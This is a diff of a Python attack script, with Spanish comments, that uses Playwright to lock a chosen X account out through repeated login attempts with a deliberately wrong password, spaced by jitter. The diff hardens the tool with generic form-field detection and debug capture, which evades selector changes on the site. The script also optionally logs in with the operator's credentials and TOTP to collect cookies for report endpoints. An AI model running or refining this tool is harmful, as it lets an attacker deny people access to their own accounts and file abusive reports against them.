@@ -1,8 +1,7 @@
 """
 Lockout continuo para una cuenta de X usando un navegador REAL (Playwright).
-X retiro el flujo de login que usaba twikit (LoginRetired), asi que ahora
-hacemos los intentos de login de verdad en Chromium.
-El reporte (opcional) se hace con twikit autenticando por cookies.
+Version robusta: no depende de selectores fijos, busca los campos de forma
+generica y guarda capturas + HTML en debug/ cuando algo falla.
 """
 
 import asyncio
@@ -27,19 +26,10 @@ JITTER_SEGUNDOS = 60
 
 X_USER = os.environ.get("X_USER") or None
 X_PASS = os.environ.get("X_PASS") or None
-X_EMAIL = os.environ.get("X_EMAIL") or None
 X_TOTP = os.environ.get("X_TOTP") or None
 HACER_REPORTE = bool(X_USER and X_PASS)
 
 LOGIN_URL = "https://x.com/i/flow/login"
-
-SEL_USUARIO = ['input[autocomplete="username"]', 'input[name="text"]', 'input[type="text"]']
-SEL_PASS = ['input[name="password"]', 'input[type="password"]']
-SEL_NEXT = ['button:has-text("Next")', 'button:has-text("Siguiente")',
-            '[data-testid="ocfEnterTextNextButton"]']
-SEL_LOGIN = ['button:has-text("Log in")', 'button:has-text("Iniciar")',
-             '[data-testid="LoginForm_Login_Button"]']
-SEL_CODIGO = ['input[autocomplete="one-time-code"]']
 # ----------------------------------------------------------------
 
 REPORT_ENDPOINTS = [
@@ -56,47 +46,106 @@ def log(msg):
     print(f"[{datetime.now(timezone.utc):%Y-%m-%d %H:%M:%S} UTC] {msg}", flush=True)
 
 
-async def _fill(page, selectores, valor, timeout=5000):
-    for sel in selectores:
+async def guardar_debug(page, etiqueta):
+    os.makedirs("debug", exist_ok=True)
+    try:
+        await page.screenshot(path=f"debug/{etiqueta}.png", full_page=True)
+    except Exception:
+        pass
+    try:
+        with open(f"debug/{etiqueta}.html", "w", encoding="utf-8") as f:
+            f.write(await page.content())
+    except Exception:
+        pass
+    log(f"    [debug] guardado debug/{etiqueta}.png/.html | url={page.url}")
+
+
+async def primer_visible(page, selector):
+    loc = page.locator(selector)
+    n = await loc.count()
+    for i in range(n):
+        el = loc.nth(i)
         try:
-            await page.fill(sel, valor, timeout=timeout)
+            if await el.is_visible():
+                return el
+        except Exception:
+            continue
+    return None
+
+
+async def escribir_usuario(page, valor):
+    for sel in ['input[autocomplete="username"]', 'input[name="text"]',
+                'input[type="text"]', 'input[type="email"]', 'input[type="tel"]']:
+        try:
+            await page.fill(sel, valor, timeout=2500)
             return True
         except Exception:
             continue
+    el = await primer_visible(page, "input")
+    if el is not None:
+        try:
+            await el.fill(valor, timeout=3000)
+            return True
+        except Exception:
+            pass
+    el = await primer_visible(page, '[contenteditable="true"]')
+    if el is not None:
+        try:
+            await el.click()
+            await page.keyboard.type(valor)
+            return True
+        except Exception:
+            pass
     return False
 
 
-async def _click(page, selectores, timeout=5000):
-    for sel in selectores:
+async def escribir_password(page, valor):
+    for sel in ['input[name="password"]', 'input[type="password"]']:
         try:
-            await page.click(sel, timeout=timeout)
+            await page.fill(sel, valor, timeout=3000)
             return True
         except Exception:
             continue
+    el = await primer_visible(page, "input")
+    if el is not None:
+        try:
+            await el.fill(valor, timeout=3000)
+            return True
+        except Exception:
+            pass
     return False
 
 
-async def un_intento(page, usuario, password, totp=None):
-    """Un intento de login real. Con password incorrecta -> intento fallido."""
+async def un_intento(page, usuario, password, totp=None, etiqueta="intento"):
     await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
-    if not await _fill(page, SEL_USUARIO, usuario):
-        raise RuntimeError("no encontre campo de usuario")
-    await _click(page, SEL_NEXT)
-    await page.wait_for_timeout(2500)
+    try:
+        await page.wait_for_selector("input", timeout=25000, state="visible")
+    except Exception:
+        pass
 
-    if not await _fill(page, SEL_PASS, password):
+    if not await escribir_usuario(page, usuario):
+        await guardar_debug(page, etiqueta + "_sin_usuario")
+        raise RuntimeError("no encontre campo de usuario")
+
+    await page.keyboard.press("Enter")
+    await page.wait_for_timeout(3000)
+
+    if not await escribir_password(page, password):
+        await guardar_debug(page, etiqueta + "_sin_password")
         raise RuntimeError("no encontre campo de password")
-    await _click(page, SEL_LOGIN)
+
+    await page.keyboard.press("Enter")
     await page.wait_for_timeout(4000)
 
     if totp:
-        try:
-            if await page.locator(SEL_CODIGO[0]).count() > 0:
-                await _fill(page, SEL_CODIGO, pyotp.TOTP(totp).now())
-                await _click(page, SEL_NEXT + SEL_LOGIN)
+        el = await primer_visible(page, 'input[autocomplete="one-time-code"]')
+        if el is not None:
+            try:
+                await el.fill(pyotp.TOTP(totp).now())
+                await page.keyboard.press("Enter")
                 await page.wait_for_timeout(3500)
-        except Exception:
-            pass
+            except Exception:
+                pass
 
 
 async def rafaga(usuario, intentos):
@@ -107,14 +156,12 @@ async def rafaga(usuario, intentos):
             contexto = await navegador.new_context(locale="en-US")
             pagina = await contexto.new_page()
             try:
-                await un_intento(pagina, usuario, CONTRASENA_FALSA)
+                await un_intento(pagina, usuario, CONTRASENA_FALSA, etiqueta=f"err_{i}")
                 log(f"  intento {i}/{intentos}: enviado")
+                if i == 1:
+                    await guardar_debug(pagina, "primero_ok")
             except Exception as e:
                 log(f"  intento {i}/{intentos}: error {type(e).__name__}: {e}")
-                try:
-                    await pagina.screenshot(path=f"debug/error_{i}.png")
-                except Exception:
-                    pass
             finally:
                 await contexto.close()
             await asyncio.sleep(PAUSA_ENTRE_INTENTOS)
@@ -126,7 +173,7 @@ async def cookies_de_login(usuario, password, totp=None):
         navegador = await p.chromium.launch(headless=True)
         contexto = await navegador.new_context(locale="en-US")
         pagina = await contexto.new_page()
-        await un_intento(pagina, usuario, password, totp)
+        await un_intento(pagina, usuario, password, totp, etiqueta="login_report")
         galletas = await contexto.cookies()
         await navegador.close()
     return {c["name"]: c["value"] for c in galletas}
